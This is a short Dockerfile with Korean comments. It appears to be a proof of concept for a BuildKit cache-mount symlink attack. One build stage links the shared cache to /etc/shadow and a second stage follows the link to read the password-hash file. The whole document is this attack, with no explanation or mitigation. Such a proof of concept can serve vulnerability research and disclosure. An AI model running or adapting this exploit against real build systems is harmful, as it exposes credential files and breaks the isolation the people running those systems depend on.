# syntax=docker/dockerfile:1.4

# 단계 1: symlink를 생성해 /cache/leak가 /etc/shadow를 가리키게 함
FROM alpine AS make_symlink
RUN --mount=type=cache,target=/cache \
    ln -sf /etc/shadow /cache/leak && sleep 2

# 단계 2: symlink를 따라가 /etc/shadow를 읽음
FROM alpine AS read_link
RUN --mount=type=cache,target=/cache \
    cat /cache/leak || echo "could not read symlink"
